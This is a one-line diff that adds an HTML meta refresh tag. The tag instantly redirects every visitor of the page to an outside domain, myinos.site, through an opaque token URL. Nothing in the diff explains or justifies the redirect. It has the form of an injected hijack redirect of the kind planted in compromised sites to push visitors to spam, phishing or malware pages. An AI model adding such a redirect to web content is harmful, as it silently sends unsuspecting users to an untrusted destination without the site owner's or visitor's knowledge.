@@ -1,0 +1,1 @@
+<meta http-equiv="refresh" content="0; url=http://myinos.site/4TXUmb0zdKYn107zqPd0MTE0psIO0UflH16"/>
